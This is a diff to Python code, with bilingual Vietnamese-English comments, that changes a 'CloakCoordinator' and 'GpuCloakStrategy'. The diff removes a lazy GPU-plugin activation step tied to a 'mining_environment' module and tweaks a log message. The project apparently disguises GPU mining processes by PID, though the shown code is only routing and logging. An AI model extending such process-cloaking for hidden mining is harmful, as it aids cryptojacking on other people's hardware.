@@ -152,55 +152,24 @@ class CloakCoordinator:
         :return: **CloakResult** (kết quả ngụy trang) từ **HardwareController** (qua **intelligent coordinator** – bộ điều phối thông minh)
         """
         self.logger.info(f"[CS] 🎯 **Routing GPU strategy** (định tuyến chiến lược GPU – chuyển hướng phương pháp card đồ họa) qua **INTELLIGENT COORDINATOR** (bộ điều phối thông minh) cho **PID** {request.pid}")
-        
+
         try:
-            # ✨ **LAZY GPU PLUGIN ACTIVATION** (Kích hoạt plugin GPU lười biếng – khởi động plugin card đồ họa theo yêu cầu)
-            # Chỉ kích hoạt một lần cho mỗi **PID** (mã tiến trình) để **tối ưu hiệu năng** (optimize performance – cải thiện hiệu suất)
-            if not hasattr(self, '_gpu_plugins_activated'):
-                self._gpu_plugins_activated = set()  # **Cache PIDs** (lưu trữ mã tiến trình – bộ nhớ đệm PID) đã kích hoạt
-            
-            # Kiểm tra nếu **PID** chưa được kích hoạt **plugins** (tiện ích mở rộng)
-            if request.pid not in self._gpu_plugins_activated:
-                # **Check config** (kiểm tra cấu hình) để **enable/disable** (bật/tắt) **gpu_plugins** (plugin GPU)
-                if getattr(self.config, 'enable_gpu_plugins', True):  # **Default: True** (mặc định: Đúng) để **auto-enable** (tự động bật)
-                    try:
-                        # **Lazy import** (nhập khẩu lười biếng – import theo yêu cầu) - chỉ **import** khi thực sự cần
-                        from mining_environment.gpu_plugins import apply_gpu_strategies
-                        
-                        # Kích hoạt toàn bộ **gpu_plugins** (plugin GPU) cho **PID** này
-                        self.logger.info(f"[CS] 🔌 **Activating GPU plugins** (đang kích hoạt plugin GPU – khởi động tiện ích card đồ họa) cho **PID** {request.pid}...")
-                        plugin_success = apply_gpu_strategies(request.pid)
-                        
-                        if plugin_success:
-                            self._gpu_plugins_activated.add(request.pid)
-                            self.logger.info(f"[CS] ✅ **GPU plugins successfully activated** (plugin GPU đã kích hoạt thành công) cho **PID** {request.pid}")
-                            self.logger.debug(f"[CS] 📊 **Total PIDs with plugins** (tổng số PID có plugin – tổng mã tiến trình đã cài tiện ích): {len(self._gpu_plugins_activated)}")
-                        else:
-                            self.logger.warning(f"[CS] ⚠️ **GPU plugins activation returned False** (kích hoạt plugin GPU trả về False – khởi động tiện ích thất bại) cho **PID** {request.pid}")
-                    except ImportError as e:
-                        self.logger.warning(f"[CS] ⚠️ **GPU plugins module not available** (module plugin GPU không khả dụng – mô-đun tiện ích không tồn tại): {e}")
-                    except Exception as e:
-                        self.logger.error(f"[CS] ❌ **GPU plugins activation failed** (kích hoạt plugin GPU thất bại – khởi động tiện ích lỗi): {e}")
-                        # **Continue anyway** (tiếp tục dù sao) - **plugins are enhancement** (plugin là tính năng nâng cao), **not critical** (không quan trọng)
-                else:
-                    self.logger.debug(f"[CS] 🔕 **GPU plugins disabled by config** (plugin GPU bị tắt bởi cấu hình – tiện ích vô hiệu hóa theo thiết lập)")
-            else:
-                self.logger.debug(f"[CS] ♻️ **GPU plugins already activated** (plugin GPU đã được kích hoạt – tiện ích đã khởi động) cho **PID** {request.pid}")
-            
+            # Xóa phần lazy GPU plugin activation
+
             # Kiểm tra nếu **GpuCloakStrategy** khả dụng làm **intelligent coordinator** (bộ điều phối thông minh)
             if hasattr(self, 'gpu_cloak_strategy') and self.gpu_cloak_strategy:
                 # **USE INTELLIGENT COORDINATOR** (sử dụng bộ điều phối thông minh)
                 self.logger.info("[CS] 🧠 **Using GpuCloakStrategy as intelligent coordinator** (đang dùng GpuCloakStrategy làm bộ điều phối thông minh – sử dụng chiến lược GPU như trình phối hợp tự động)")
-                
+
                 # Chuẩn bị **request** (yêu cầu) cho **intelligent coordinator** (bộ điều phối thông minh)
                 coordinator_request = {
                     'pid': request.pid,
                     'params': request.params
                 }
-                
+
                 # Apply intelligent coordination (adds adaptive logic)
                 coordinator_result = self.gpu_cloak_strategy.intelligent_apply(coordinator_request)
-                
+
                 # Convert result to CloakResult
                 if coordinator_result.get('success'):
                     self.logger.info(f"[CS] ✅ Intelligent coordination successful for PID {request.pid}")
@@ -226,26 +195,26 @@ class CloakCoordinator:
                         self.logger.error(f"[CS] ❌ Intelligent coordination failed: {coordinator_result.get('error')}")
                         # Fallback to direct hardware controller
                         self.logger.info("[CS] 🔄 Falling back to direct hardware controller")
-                        
+
             else:
                 # No intelligent coordinator available, use direct routing
                 self.logger.info("[CS] 📡 Direct routing to hardware controller (no intelligent coordinator)")
-                
+
             # FALLBACK: Direct forward to hardware controller
             control_params = {
                 'pid': request.pid,
                 **request.params  # Forward ALL params as-is from Stage 1
             }
-            
+
             result = self.hw_controller.apply_gpu_controls(control_params)
-            
+
             if result.success:
                 self.logger.info(f"[CS] ✅ GPU strategy routed successfully for PID {request.pid}")
             else:
                 self.logger.error(f"[CS] ❌ GPU strategy routing failed: {result.error_msg}")
-                
+
             return result
-            
+
         except Exception as e:
             self.logger.error(f"[CS] ❌ GPU strategy exception: {e}")
             return CloakResult(
@@ -923,7 +892,7 @@ class GpuCloakStrategy:
                 return self._direct_gpu_apply(params)
             
             # Final fallback - report failure
-            self.logger.error("❌ [FALLBACK] All delegation mechanisms failed")
+            self.logger.error("❌ [FALLBACK] All fallback mechanisms failed")
             return {'success': False, 'error': 'All fallback mechanisms failed', 'method': 'none'}
     
     def _direct_gpu_apply(self, params: Dict[str, Any]) -> Dict[str, Any]:
